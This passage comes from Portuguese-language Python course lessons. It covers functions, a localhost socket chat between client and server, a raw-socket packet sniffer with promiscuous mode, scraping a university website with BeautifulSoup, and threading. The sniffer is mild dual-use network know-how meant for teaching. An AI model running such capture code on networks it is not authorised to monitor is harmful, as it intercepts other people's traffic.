gráfica e nem “ç”. Não passamos nenhum parâmetro, por isso o parêntesis após o nome da função está vazio e não esqueça de colocar os dois pontos “:”.

Agora, para utilizarmos a função, basta chama-la pelo nome acompanhado pelo parêntesis (mesmo que vazio), como fizemos na linha 5.

EXEMPLO 2:

>>> def raizQuadrada(numero):
	return math.sqrt(numero)
 
>>> raizQuadrada(81)
9.0
No exemplo 2, criamos a função, com o parâmetro numero, que neste caso, comporta-se como uma 
variável e na hora de executarmos a função na linha 4, além do nome da função, passamos o valor 
81 para o parâmetro entre parêntesis, este valor é atribuído como argumento de entrada do parâmetro numero e é conhecido como passagem por valor.

EXEMPLOS  3 e 4:

>>> def raizQuadrada(num1, num2):
	num1 = math.sqrt(num1)
	num2 = math.sqrt(num2)
	return num1,num2
 
>>> raizQuadrada(81,9)
(9.0, 3.0)
>>> def raizQuadrada(num1, num2):
	num1 = math.sqrt(num1)
	num2 = math.sqrt(num2)
	print (num1," , ",num2)
 
	
>>> raizQuadrada(81,9)
9.0  ,  3.0
Nos exemplos acima, utilizamos dois parâmetros de entrada e na hora de chamarmos a função, passamos dois valores.

No exemplo 4, não utilizamos o comando return, trocamos na linha 4, pelo comando print.

EXEMPLO 5:

def mensagem():
	print("A raiz quadrada é: ")
 
def raizQuadrada(num):
	num = math.sqrt(num)
	mensagem()
	print(num)
 
>>> raizQuadrada (81)
A raiz quadrada é: 
9.0
No EXEMPLO 5, criamos a função mensagem e a função raizQuadrada. Dentro da função raizQuadrada 
chamamos a função mensagem (linha 6) e ao executarmos a função raizQuadrada, a função mensagem( ) também será executada, mostrando a saída nas linhas 10 e 11.

A FUNÇÃO LAMBDA
A função lambda na realidade não é uma função e sim uma expressão ou também conhecida como função 
anônima (sem nome). Dai, já percebemos a diferença para uma função que é denominada, nós não podemos chama-la pelo nome (já que não tem!).

A sintaxe é:

lambda parâmetros: expressão

Lembrando que os parâmetros são opcionais e não se esqueça dos dois pontos “:”.

EXEMPLO 6:

>>> num = lambda: math.sqrt(81)
>>> num()
9.0
No exemplo 6, criamos a variável num e passamos a função lambda com a expressão matemática da
 raiz quadrada de 81. A variável num (linha 2), neste caso, é acompanhada de parêntesis para executar a função lambda.

---------------------------------------------------------------------------------------------------------------------------------------------------

Recebendo uma conexão em um servidor Python
Criar um exemplo de aplicação trocando mensagens entre uma conexão cliente e servidor.

NESTE TÓPICO
 Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
 Referências
NESTE TÓPICO

 Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
 Referências
Marcar
tópico

     

Olá alunos.

Vamos ver um exemplo de aplicação, criando um servidor e um cliente Python e trocando mensagens entre eles.

O primeiro passo é criar o servidor Python através de um script, para isso vamos abrir o IDLE e em FILE, NEW FILE e digitar:

import socket
 
host = '127.0.0.1'  # o mesmo que localhost
porta = 8800         # porta da conexão
Como vamos usar o módulo socket, então importamos todas as funções deste módulo (linha 1).
 Depois criamos o endereço do host e da porta da conexão, no cliente deverá ter o mesmo valor para o host
 e para a porta. O IP 127.0.0.1 é o mesmo que localhost, pois se trata de uma conexão local, tipo intranet.

import socket
 
host = '127.0.0.1'  # o mesmo que localhost
porta = 8800         # porta da conexão
 
soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #estou usando TCP/IP
recebe = (host, porta)
soquete.bind(recebe)
soquete.listen(2)
Continuando...na linha 6, criamos uma variável soquete e atribuindo, chamamos a função socket do módulo 
socket e mais duas funções: AF_INET: para conexão entre endereços IP e é a que vai determinar um valor para a porta e 
SOCK_STREAM: porque vamos usar o protocolo TCP (se fosse usar outro protocolo de transmissão como UDP, por exemplo, teríamos que usar: SOCK_DGRAM).

Na linha 7, criamos a variável recebe e atribuímos os valores do host e da porta.

Na linha 8, a variável soquete utiliza a função bind, para apanhar os valores da variável recebe (colocar um valor de IP e da porta no socket).

Na linha 9, a conexão atribuída a variável soquete aceita (ouve) até duas conexões cliente, você pode aumentar este valor conforme a necessidade.

import socket
 
host = '127.0.0.1'  # o mesmo que localhost
porta = 8800         # porta da conexão
 
soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #estou usando TCP/IP
recebe = (host, porta)
soquete.bind(recebe)
soquete.listen(2)
 
print('\nSERVIDOR INICIADO...IP: ', host, 'PORTA: ', porta)
 
while True:
    conexao, enderecoIP = soquete.accept()
    print('\nSERVIDOR ACESSADO PELO CLIENTE:', enderecoIP)
Na linha 11, exibe uma mensagem quando subirmos o servidor, mostrando o endereço do IP do servidor e o número da porta.

Na linha 13, abrimos um loop com while, passando o valor booleano True, isto é equivalente ao 
comando em C: loop( ), ou seja, todos os comandos abaixo dele serão repetidos até que ocorra alguma 
interrupção. Na linha 14, criamos as variáveis conexao e enderecoIP recebendo e aceitando a conexão do cliente através da função accept().

Na linha 15, a mensagem será exibida no servidor quando o cliente for executado, mostrando o endereço
 de IP do cliente e um valor para porta, gerada pela função AF_INET.

import socket
 
host = '127.0.0.1'  # o mesmo que localhost
porta = 8800         # porta da conexão
 
soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #estou usando TCP/IP
recebe = (host, porta)
soquete.bind(recebe)
soquete.listen(2)
 
print('\nSERVIDOR INICIADO...IP: ', host, 'PORTA: ', porta)
 
while True:
    conexao, enderecoIP = soquete.accept()
    print('\nSERVIDOR ACESSADO PELO CLIENTE:', enderecoIP)
 
    while True:
        mensagem = conexao.recv(2048)
        if not mensagem:
            break
        print('\nIP CLIENTE:', enderecoIP)
        print('MENSAGEN RECEBIDA: ', mensagem.decode())
 
    print('CONEXÃO COM O CLIENTE FINALIZADA...', enderecoIP)
    conexao.close()
Continuando...na linha 17, abrimos outro loop com while e True para receber a mensagem do 
cliente. Criamos a variável mensagem que recebe o valor da variável conexao que o soquete aceitou
 e através da função recv(2048), recebe o texto da mensagem, o valor entre parêntesis, 2048, significa
 que vai aceitar textos com até 2K Bytes de caracteres. Você pode alterar este valor.

Na linha 19, temos um if que, senão receber mais nenhuma mensagem, o loop será interrompido.

Nas linhas 21 e 22, no servidor será exibido o número do IP e a mensagem recebida do cliente.

Na linha 24, será exibida a mensagem caso o cliente interromper a conexão.

Antes de finalizarmos o script, vamos incrementar mais um pouco o código:

# CRIANDO UM SERVIDOR PYTHON
import socket
from datetime import *
 
host = '127.0.0.1'  # o mesmo que localhost
porta = 8800         # porta da conexão
 
soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #estou usando TCP/IP
recebe = (host, porta)
soquete.bind(recebe)
soquete.listen(2)
 
print('\nSERVIDOR INICIADO...IP: ', host, 'PORTA: ', porta,' EM: ',datetime.now().strftime('%d/%m/%Y - %H:%M:%S'))
 
while True:
    conexao, enderecoIP = soquete.accept()
    print('\nSERVIDOR ACESSADO PELO CLIENTE:', enderecoIP, 'EM: ',datetime.now().strftime('%d/%m/%Y - %H:%M:%S'))
 
    while True:
        mensagem = conexao.recv(2048)
        if not mensagem:
            break
        print('\nIP CLIENTE:', enderecoIP)
        print('MENSAGEN RECEBIDA: ', mensagem.decode(),' - ',datetime.now().strftime('%H:%M:%S'))
 
    print('CONEXÃO COM O CLIENTE FINALIZADA...', enderecoIP, ' EM: ',datetime.now().strftime('%d/%m/%Y - %H:%M:%S'))
    conexao.close()
Acrescentamos a linha 3, importando tudo da classe datetime, para registrarmos também a data e a hora das ocorrências.

Na linhas 13, 17, 24 e 26, foi acrescentado nas mensagens, as funções datetime.now( ) que captura a data do sistema e com o print é 
data e a hora também é impressa, foi utilizada junto a função strftime(  ) para formatarmos a data e a hora do sistema, porque a data vem no padrão 
britânico: ano/mês/dia e os segundos são mostrados em frações de até bilissegundos. Então, utilizamos os parâmetros: %d = dia, %m = mês, %Y = ano 
com 4 dígitos, %H = hora no padrão 24 (se quiser usar padrão 12, utilize %I), %M = minutos e %S = segundos.

Gravamos o script com o nome: servidor.py.

Vamos agora criar outro script para o cliente:

# criando um cliente para conexão com o servidor Python
import socket
 
host = '127.0.0.1'  # mesmo local do servidor
porta = 8800        # mesma porta do servidor
 
soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
envio = (host,porta)
soquete.connect(envio)
 
print('Digite: S e pressione ENTER para encerrar...') 
print('DIGITE A MENSAGEM: ')
mensagem = input()
 
while mensagem not in ('s','S'):
    soquete.send(str(mensagem).encode())
    mensagem = input()
 
soquete.close()
Importamos o módulo socket e criamos as mesmas variáveis e valores para host, porta e soquete (linhas 2, 4, 5 e 7).

Na linha 8, foi criada a variável envio para enviar o host e a porta ao servidor.

Na linha 9, o soquete faz a conexão com a função connect.

Nas linhas 11 e 12, são mensagens impressas no cliente.

Na linha 15, abrimos um loop com while sob a condição de enquanto não digitado a letra s ou S pelo cliente, as mensagens serão enviadas ao 
servidor (linha 16) através da função send.

Quando o cliente digitar s e pressionar ENTER, a conexão será encerrada (linha 19).

Gravamos o script com o nome: cliente.py.

Traceback (most recent call last):
  File "C:\Users\djsch\OneDrive\Área de Trabalho\cliente.py", line 9, in <module>
    soquete.connect(envio)
ConnectionRefusedError: [WinError 10061] Nenhuma conexão pôde ser feita porque a máquina de destino as recusou ativamente
Ao executarmos o script cliente.py a mensagem acima será exibida porque o servidor não está no ar.

Então, vamos executar primeiro o sript servidor.py:

SERVIDOR INICIADO...IP:  127.0.0.1 PORTA:  8800  EM:  03/06/2018 - 18:19:03
Ao dar um duplo clique no script servidor.py, a mensagem acima será exibida no terminal do servidor. Registrando o endereço do IP do servidor,
 a porta e a data e hora em que o servidor subiu.

Agora vamos executar o script cliente.py:

Digite: S e pressione ENTER para encerrar...
DIGITE A MENSAGEM:
Ao dar duplo clique no script cliente.py um outro terminal será aberto, é como se estivéssemos acessando de outro dispositivo.
 Esta mensagem acima será exibida no terminal do cliente.

Agora vamos ver o que aconteceu no terminal do servidor:

SERVIDOR INICIADO...IP:  127.0.0.1 PORTA:  8800  EM:  03/06/2018 - 18:19:03
 
SERVIDOR ACESSADO PELO CLIENTE: ('127.0.0.1', 53522) EM:  03/06/2018 - 18:26:36
No terminal do servidor acima, aparecerá os dados do cliente que acessou, o IP, a porta que é um número aleatório gerado pela função
 AF_INET e a data e hora da conexão.

Agora vamos voltar ao terminal do cliente e digitar uma mensagem:

Digite: S e pressione ENTER para encerrar...
DIGITE A MENSAGEM:
Olá pessoal
Estou estudando Python
E enviando uma mensagem ao servidor Python
Agora, vamos ver o que ocorreu no terminal do servidor:

SERVIDOR INICIADO...IP:  127.0.0.1 PORTA:  8800  EM:  03/06/2018 - 18:19:03
 
SERVIDOR ACESSADO PELO CLIENTE: ('127.0.0.1', 53522) EM:  03/06/2018 - 18:26:36
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  Olá pessoal  -  18:37:49
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  Estou estudando Python  -  18:38:03
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  E enviando uma mensagem ao servidor Python  -  18:38:42
OK! Todas mensagens foram recebidas pelo servidor.

Agora vamos encerrar o terminal do cliente, digitando s e pressionando ENTER, depois veremos o que ocorreu no terminal do servidor:

SERVIDOR INICIADO...IP:  127.0.0.1 PORTA:  8800  EM:  03/06/2018 - 18:19:03
 
SERVIDOR ACESSADO PELO CLIENTE: ('127.0.0.1', 53522) EM:  03/06/2018 - 18:26:36
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  Olá pessoal  -  18:37:49
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  Estou estudando Python  -  18:38:03
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  E enviando uma mensagem ao servidor Python  -  18:38:42
CONEXÃO COM O CLIENTE FINALIZADA... ('127.0.0.1', 53522)  EM:  03/06/2018 - 18:48:49
A conexão do terminal do cliente foi fechada e a ação foi registrada no terminal do servidor como visto na linha 13.

Agora, vamos abrir de novo o terminal do cliente, dando um duplo clique no script cliente.py, enviando mais uma mensagem e 
verificar o que aconteceu no terminal do servidor:

SERVIDOR INICIADO...IP:  127.0.0.1 PORTA:  8800  EM:  03/06/2018 - 18:19:03
 
SERVIDOR ACESSADO PELO CLIENTE: ('127.0.0.1', 53522) EM:  03/06/2018 - 18:26:36
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  Olá pessoal  -  18:37:49
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  Estou estudando Python  -  18:38:03
 
IP CLIENTE: ('127.0.0.1', 53522)
MENSAGEN RECEBIDA:  E enviando uma mensagem ao servidor Python  -  18:38:42
CONEXÃO COM O CLIENTE FINALIZADA... ('127.0.0.1', 53522)  EM:  03/06/2018 - 18:48:49
 
SERVIDOR ACESSADO PELO CLIENTE: ('127.0.0.1', 53616) EM:  03/06/2018 - 18:56:35
 
IP CLIENTE: ('127.0.0.1', 53616)
MENSAGEN RECEBIDA:  Oi, pessoal estou de volta!  -  18:57:01
Novamente, o servidor registrou a nova conexão do cliente (linha 15) e a mensagem foi recebida! (linha 18).

SAIBA MAIS...
Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
https://www.python.org/doc/

https://wiki.python.org/moin/PythonBooks

Neste tópico criamos um exemplo de aplicação em Python, trocando mensagens entre uma conexão cliente e servidor.
-----------------------------------------------------------------------------------------------------------------------

Packet Analyzer: criação de Packet Sniffer
Apresentar os recursos para monitorar entrada e saída de dados pela rede através de um analisador tipo sniffer.

NESTE TÓPICO
 OS SNIFFERs
 Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
 Referências
NESTE TÓPICO

 OS SNIFFERs
 Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
 Referências
Marcar
tópico

     

Olá alunos,

Vamos ver agora como farejar (sniffer) ou monitorar a entrada e saída de pacotes de dados pela internet. Hoje existem vários tipos de aplicativos que
 realizam esta atividade, mas vamos ver como criar um scriot relativamente simples em Python e outros recursos que podem ser utilizados através desta linguagem.

Lembrando que todos os dados que entram na via de transmissão pela rede são empacotados e etiquetados e isto exige certos padrões, por exemplo, 
se você precisa fazer uma entrega de uma encomenda pelo correio, deverá obedecer regras (padrões) para esta entrega, deverá colocar em um compartimento
 (depende do tamanho do material) para embalar e colocar em um local visível neste pacote todos os detalhes do destinatário: nome, endereço e o número do CEP.

Analogicamente, ocorre o mesmo na transmissão de dados, os dados são divididos em pacotes, em quantidades de bytes, obedecendo um padrão, o TCP,
 por exemplo e é colocado uma etiqueta, um endereço, no cabeçalho (header) de cada pacote que entrará na via de transmissão (por cabo ou por wireless).

No destino, estes pacotes serão juntados, para compor a mensagem ou o arquivo, que poderá ser de tipo caractere, de áudio ou de vídeo.

OS SNIFFERs
Os sniffers são aplicativos que verificam este transito de dados, na entrada e saída de um computador especificado, na realidade, estes aplicativos 
acessam a placa de rede deste computador e verificam os pacotes que estão chegando e saindo pela placa.

Estes aplicativos (sniffers) acessam as informações na rede em um nível mais baixo do que estamos acostumados, por isso, o retorno das informações estão 
próximas a linguagem Assembler, em valores hexadecimais, daí, necessitaremos de um aplicativo ou recurso para deixar a informação em um nível mais alto.

É necessário utilizar algo que já vimos antes, o socket para acessar as informações dos cabeçalhos com os IP e ICMP.

A ideia é fazer um scan (varrer) na rede do computador designado, isto também vai depender sobre qual sistema operacional você fará a ação: Windows ou Linux.

O Windows, por exemplo, exige alguns sinalizadores como IOCTL (Input Output Control), controle de entrada e saída que permite habilitar o modo promiscuo
 da interface de rede (Windows).

Por questão de segurança do Windows, você precisa habilitar, principalmente, nas versões do Windows, acima do Windows 7, esse modo promiscuo para acessar o socket.

Vamos ver um exemplo de script para sniffer:

# script para sniffer
import socket
import os
 
host = "192.168.0.14" # este é o IP do meu host, o computador alvo que será escaneado
 
# cria o socket
if os.name == "nt":
    socket_protocol = socket.IPPROTO_IP # verifica se o protocolo é endereço IP ou ICMP
else:
    socket_protocol = socket.IPPROTO_ICMP
 
sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) 
 
sniffer.bind((host, 0)) # aguarda o host
 
sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # captura os cabeçalhos IP dos pacotes
 
if os.name == "nt":
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) # para Windows, habilita o modo promiscuo
 
print (sniffer.recvfrom(10000)) # recebe o IP do pacote
 
if os.name == "nt":
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) # para Windows, desabilita o modo promiscuo
No caso do bloco if , na linha 8, verifica se na rede “nt” o protocolo é IP ou se é ICMP, se for trabalhar com Windows, não é necessário este bloco if, 
este bloco é necessário para Linux.

Na linha 17, captura os endereços com IP, neste exemplo, não será capturado os pacotes com ICMP.

Nas linhas 19 e 20, habilita o modo promiscuo e nas linhas 24 e 25, desabilitam o modo promiscuo. O modo promiscuo permite fazer sniffing (varredura)
 de qualquer pacote que passa pela placa de rede.

Lembre-se que para trabalhar com o modo promiscuo, você precisa ter privilégios de administrador no Windows.

Neste script, capturamos apenas um pacote, mas podemos simplificar mais o script com outro exemplo:

import socket
 
host = "192.168.0.14"
 
sniffer = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_IP) # considerando só o protocolo IP
 
sniffer.bind((host,0))
 
sniffer.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) # captura o cabeçalho IP dos cabeçalhos
 
sniffer.ioctl(socket.SIO_RCVALL,socket.RCVALL_ON) # Para Windows
 
while True:
   dados = sniffer.recvfrom(10000) # recebe o IP do pacote
   print (dados)
O resultado será algo parecido com isto:

   01 00 5e 7f ff fa fc f1 36 b3 1d 52 08 00 45 00   
   00 3f 4e 01 40 00 40 11 3b ff c0 a8 00 0b ef ff   
   ff fa a1 f9 3c f0 00 2b 27 c9 53 45 41 52 43 48   
   20 42 53 44 50 2f 30 2e 31 0a 44 45 56 49 43 45   
   3d 30 0a 53 45 52 56 49 43 45 3d 31 0a  
Como já comentado, o script vai agir diretamente no hardware, em baixo nível e por isso a resposta vai ser também da mesma forma, como no exemplo acima, 
a resposta foi em hexadecimal.

Para melhorar a resposta teríamos que utilizar outros recursos, no caso, do Python pode-se utilizar uma extensão da biblioteca como wireshark, mas este 
recurso acabou se tornando independente  e você pode fazer download diretamente através do link http://wireshark.org/ é de licença livre e totalmente gratuito 
e hoje é um dos sniffer mais utilizados.

A instalação é tranquila pois basta aceitar a licença e de resto é só ir clicando até a conclusão.

No exemplo abaixo, vamos utilizar o wireshark para fazer o mesmo trabalho, e vamos fazer um teste acessando o site da Uninove:

Ethernet II, Src: SamsungE_b3:1d:52 (fc:f1:36:b3:1d:52), Dst: IPv4mcast_7f:ff:fa (01:00:5e:7f:ff:fa)
www.uninove.br
Num	time		source		destination	protocol	lenght	Info
881	4.567906	192.168.0.14	143.137.103.67	TCP		54	77 bytes captured (616 bits) on interface
O recurso também traz o resultado em hexadecimal e o resultado como acima, verifica os dispositivos que estão na 
rede, como a placa de rede, a smartTV, o IPv6 e IPv4 (linha 1).

O tempo que levou para acessar, o número do IP da fonte e o número do IP do destino, o tipo de protocolo de transmissão (TCP) e os demais dados capturados (linha 4).
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

Info Gather
Apresentar um recurso em Python, o Beautiful Soup, para coletar informações da WEB.

NESTE TÓPICO
 BEAUTIFUL SOUP
 Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
 Referências
NESTE TÓPICO

 BEAUTIFUL SOUP
 Dê uma olhada nos links abaixo para saber mais sobre a linguagem Python:
 Referências
Marcar
tópico

     

Olá alunos,

Vamos tomar uma maravilhosa sopa? (do jeito que está frio hoje, até que é uma boa ideia) mas, na realidade a Beautiful Soup (Sopa Bonita) é um recurso
 utilizado para coletar informações na WEB. É um recurso do Python muito utilizado na ciência de dados.

O módulo Beautiful Soup está relacionado com a técnica de WEB Scraping (raspando a WEB). Os próprios fabricantes de navegadores, como Google Chrome® 
e Firefox®, por exemplo, também possuem estes recursos que realizam esta técnica em seus navegadores.

BEAUTIFUL SOUP
Beauiful Soup permite que você “raspe” um determinado site e extraia informações, podendo utilizar filtros. Vamos ver como podemos realizar este
 processo em Python..

Primeiramente, consideraremos a construção de páginas em HTML, lembrando que o HTML não é uma linguagem procedural e sim uma linguagem de marcação, com tags.
 E as tags são iniciadas e finalizadas com marcações, como por exemplo: (início) e (finalizar), < a > e < /a >.

O módulo Beautiful Soup consegue “parsear” (interpretar) código HTML e assim utilizar parâmetros para filtrar informações da página.

Teremos que utilizar as bibliotecas: requests (solicitações) e a BeautifulSoup.

import requests
from bs4 import BeautifulSoup
Vamos utilizar como exemplo, o site da Uninove:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get('http://www.uninove.br')
 
sopa = BeautifulSoup(pagina.text, 'html.parser')
Como a BeautifulSoup só rastreia (parser) e não pega a url do site, então antes utilizamos o método get da biblioteca requests (requests.get), passamos 
a url da Uninove e atribuímos à variável pagina (linha 4).

Ai sim, em seguida utilizamos a BeautifulSoup para “parsear” o código HTML do site da Uninove (pagina.text, ‘html.parser’) e atribuímos na variável sopa (linha 6).

Agora, vamos criar um script com um nome, por exemplo, links_uninove.py e acrescentar as seguintes linhas:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get('http://www.uninove.br')
 
sopa = BeautifulSoup(pagina.text, 'html.parser')
 
# encontra todos os links
uninove = sopa.find_all('a')
 
for i in uninove:
    print(i.prettify())
 
input('Tecle ENTER para sair...')
Os links de uma página em HTML são definidos com a tag < a > por isso utilizamos a função find_all passando o parâmetro (‘a’) para encontrar todos os links 
da página da Uninove e atribuímos à variável uninove (linha 9).

Utilizamos um loop com for e com a função prettify() verifica a estrutura do código HTML, no caso os links e com a função print mostramos todos os links
 da página Uninove.

Ao rodarmos este script, todos os links da página da Uninove e mais outras informações foram mostradas, mas poderemos melhorar esta busca:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get('http://www.uninove.br')
 
sopa = BeautifulSoup(pagina.text, 'html.parser')
 
# encontra todos os links
uninove = sopa.find_all('a')
 
for i in uninove:
    print(i.get("href"))
 
input('Tecle ENTER para sair...')
Mudamos o bloco for utilizando o método get para apanhar somente os links do site por causa do parâmetro: (“href”) (linha 12). O resultado seria algo assim:

http://www.uninove.br/unidade/memorial/
http://www.uninove.br/unidade/vergueiro/
http://www.uninove.br/unidade/vila-maria/
http://www.uninove.br/unidade/vila-prudente/
http://www.uninove.br/unidade/santo-amaro/
http://www.uninove.br/unidade/maua/
http://www.uninove.br/unidade/sao-bernardo-do-campo-2/
http://www.uninove.br/unidade/osasco-2/
http://www.uninove.br/unidade/guarulhos/
http://www.uninove.br/unidade/cotia/
Vamos apanhar outras informações do site, criando outro script com o nome: paragrafo_9.py:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get('http://www.uninove.br')
 
sopa = BeautifulSoup(pagina.text, 'html.parser')
 
# encontra todos os paragrafos
uninove = sopa.find_all('p')
 
for i in uninove:
    print(i.prettify())
 
input('Tecle ENTER para sair...')
Utilizamos novamente o método find_all, porém com o parâmetro (‘p’) para apanhar todos os parágrafos da página, pois a tag < p > são os parágrafos da página. 
E o resultado foi esse:

<p>
 Informação e conhecimento disponíveis o tempo todo para você!
</p>
 
<p>
 <a href="http://www.uninove.br/biblioteca/sobre-a-biblioteca/apresentacao/">
  Acesse.
 </a>
</p>
 
<p>
 Laboratórios das áreas de exatas e biológicas, com recursos modernos que dinamizam o aprendizado.
</p>
 
<p>
 <a href="http://www.uninove.br/conheca-a-uninove/estrutura/laboratorios/">
  Visite.
 </a>
</p>
 
<p>
 Primeira Universidade a oferecer wifi ilimitado para mais de 150 mil alunos.
</p>
 
Tecle ENTER para sair...
Podemos alterar o script para o seguinte código:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get("http://www.uninove.br")
 
sopa = BeautifulSoup(pagina.content, 'html.parser')
 
print(sopa.find_all('p')[2].get_text())
 
print(sopa.find_all('p')[4].get_text())
 
input('Tecle ENTER para sair...')
Agora utilizamos a função find_all com a função get_text para pegar somente o texto do parágrafo (‘p’) com um índice [ 2 ] e [ 4 ] que representam a 
posição do parágrafo na página, lembrando que começa pelo número 0 (zero), então [ 2 ] representa o terceiro parágrafo e a posição [ 4 ] representa o quinto 
parágrafo. E o resultado foi este:

Laboratórios das áreas de exatas e biológicas, com recursos modernos que dinamizam o aprendizado.
Primeira Universidade a oferecer wifi ilimitado para mais de 150 mil alunos.
Tecle ENTER para sair...
Agora vamos criar outro script com um nome: titulo_uni9.py:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get('http://www.uninove.br')
 
sopa = BeautifulSoup(pagina.text, 'html.parser')
 
# encontra todos os titulos
uninove = sopa.find_all('h1')
 
for i in uninove:
    print(i.prettify())
 
input('Tecle ENTER para sair...')
Como o parâmetro (‘h1’) (linha 9) representa a tag < h1 > que são todos os títulos da página. E, por último, vamos ver este outro exemplo:

import requests
from bs4 import BeautifulSoup
 
pagina = requests.get('http://www.uninove.br')
 
sopa = BeautifulSoup(pagina.text, 'html.parser')
 
# encontra todos os icones
uninove = sopa.find_all('i')
 
for i in uninove:
    print(i.prettify())
 
input('Tecle ENTER para sair...')
Neste exemplo, utilizamos o parâmetro (‘i’) que é a tag < i > do HTML e mostra todos os ícones que existem na página da Uninove.

Estes são apenas alguns exemplos de como podemos utilizar o módulo Beautiful Soup para varrer e coletar informações de uma página da WEB.

------------------------------------------------------------------------------------------------------------------------------------------------------

Multi-threading
Apresentar o recurso de multi-threading do Python para o processamento em paralelo.

NESTE TÓPICO

NESTE TÓPICO

 Referências
Marcar
tópico

     

Olá alunos,

Os processos simultâneos foram um dos recursos principais para levar o homem à Lua, na época, eles criaram um sistema operacional chamado EXEC que poderia 
executar oito processos simultaneamente, isto fez com que os sistemas operacionais que surgiram após, como UNIX, fossem multitarefas. O hardware, através do 
processador, desenvolveu a técnica de pipeline (em paralelo) para a execução das linhas de códigos.

Hoje temos processadores com vários núcleos, que podem realizar vários processos em paralelo ou independentemente. Em algumas linguagens, como CUDA,
 já é possível a programação em paralelo quando se trata de processamentos mais complexos e pesados para o computador, como processar elementos gráficos.

Além de podermos utilizar processos múltiplos, também podemos trabalhar com threads múltiplos ou multi-threads, threads são execuções de
 linhas de código de forma encadeada. No caso do thread, a divisão na hora da execução fica a cargo do sistema operacional, o SO é quem vai encadear
 a execução dos threads.

Em Python é possível criar programas com threads e distribuir processos de forma independente. Para isto, é melhor trabalharmos com as técnicas de 
orientação a objetos, criando classes e funções.

Lembrando que podemos trabalhar com funções utilizando a clausula DEF e nomeando-a, quando criamos scripts e agora vamos criar uma classe e incluiremos funções.

Vamos criar um script com o nome thread.py:

import threading
 
# Instanciando a classe principal
thread1 = principal(1, "THREAD 1", 20)
thread2 = principal(2, "THREAD 2", 15)
Primeiro importamos o módulo threading e instanciamos a classe principal, com duas varáveis thread 1 e thread 2, passando um ID, um nome e uma quantidade 
de processos.

import threading
 
# Instanciando a classe principal
thread1 = principal(1, "THREAD 1", 20)
thread2 = principal(2, "THREAD 2", 15)
 
# iniciando as threads
thread1.start()
thread2.start()
Conforme a linha 8 e 9, iniciamos as threads com a função start.

# classe principal com duas funções
class principal (threading.Thread):
    def __init__(self, threadID, nome, cont):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.nome = nome
        self.cont = cont
 
    def run(self):
        print (" Iniciando a %s com %d processos" % (self.nome,self.cont))
        processo(self.nome, self.cont)
Ao importarmos o módulo threading, criamos a classe principal e passamos como argumento (threading.Thread), utilizando a função Thread.

Definimos o método (função) __init­­__ , função padrão inicial do Python com os argumentos (self, threadID, nome, cont). A self é uma função base para 
referenciar qualquer objeto. A threadID recebe o ID, o nome e o valor do cont.

Na linha 4, a função inicial recebe a função base self.

Nas linhas 5, 6 e 7, a função base self recebe os valores das variáveis: threadID, nome e cont.

Na linha 9, criamos outra função utilizando a função run ( ) para iniciar a execução das threads, passando como argumento a função self.

Na linha 11, chamamos a função processo, passando os valores nome e cont.

import threading
 
# classe principal com duas funções
class principal (threading.Thread):
    def __init__(self, threadID, nome, cont):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.nome = nome
        self.cont = cont
 
    def run(self):
        print (" Iniciando a %s com %d processos" % (self.nome,self.cont))
        processo(self.nome, self.cont)
 
def processo(nome, cont):
    while cont:
        print (" A %s realiza o processo %d" % (nome, cont))
        cont = cont - 1
 
# Instanciando a classe principal
thread1 = principal(1, "THREAD 1", 20)
thread2 = principal(2, "THREAD 2", 15)
 
# iniciando as threads
thread1.start()
thread2.start()
Na linha 15, criamos a função processo, recebendo os valores do nome e cont. Note que a função processo não pertence à classe principal. 
Com um while sob a condição do valor cont, vai imprimindo a mensagem dos threads sendo executados até finalizar com o decremento: cont = cont – 1.

import threading
 
# classe principal com duas funções
class principal (threading.Thread):
    def __init__(self, threadID, nome, cont):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.nome = nome
        self.cont = cont
 
    def run(self):
        print (" Iniciando a %s com %d processos" % (self.nome,self.cont))
        processo(self.nome, self.cont)
 
def processo(nome, cont):
    while cont:
        print (" A %s realiza o processo %d" % (nome, cont))
        cont = cont - 1
 
# Instanciando a classe principal
thread1 = principal(1, "THREAD 1", 20)
thread2 = principal(2, "THREAD 2", 15)
 
# iniciando as threads
thread1.start()
thread2.start()
 
pipes = []
pipes.append(thread1)
pipes.append(thread2)
 
for i in pipes:
    i.join()
 
input('\nTecle ENTER para sair...')
Complementando o código, criamos a variável pipes com uma lista de threads e a função append vai encadeando as threads (linhas 28, 29 e 30).

Na linha 32, um loop com for é executado pela quantidade de threads sendo executados e a função join( ) impede que ocorra 
